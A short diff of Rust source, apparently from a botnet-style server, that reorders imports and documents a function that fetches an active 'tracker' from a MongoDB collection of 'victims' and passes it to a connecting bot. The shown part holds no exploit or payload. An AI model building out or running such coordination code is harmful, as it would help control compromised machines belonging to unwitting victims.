@@ -1,11 +1,11 @@
-use crate::victim::Victim;
-
-use tokio::{net::TcpStream, io::AsyncWriteExt};
-use mongodb::Collection;
 use mongodb::bson::{doc, to_bson};
+use mongodb::Collection;
+use tokio::{io::AsyncWriteExt, net::TcpStream};
 
 use crate::victim::{VictimDb, VictimType};
+use crate::victim::Victim;
 
+/// Finds a tracker for the bot to connect to and sends it to him
 pub async fn manage_bot(_victim: &Victim, stream: &mut TcpStream, victims_collection: &Collection<VictimDb>) -> Result<(), Box<dyn std::error::Error>> {
     let tracker = victims_collection.find_one(doc! {"status": true, "victim_type": to_bson(&VictimType::Tracker).unwrap() }, None).await.unwrap();
     // let tracker: Option<VictimDb> = Some(VictimDb {ip: "192.168.1.1".to_string(), victim_type: VictimType::Bot, active: true});
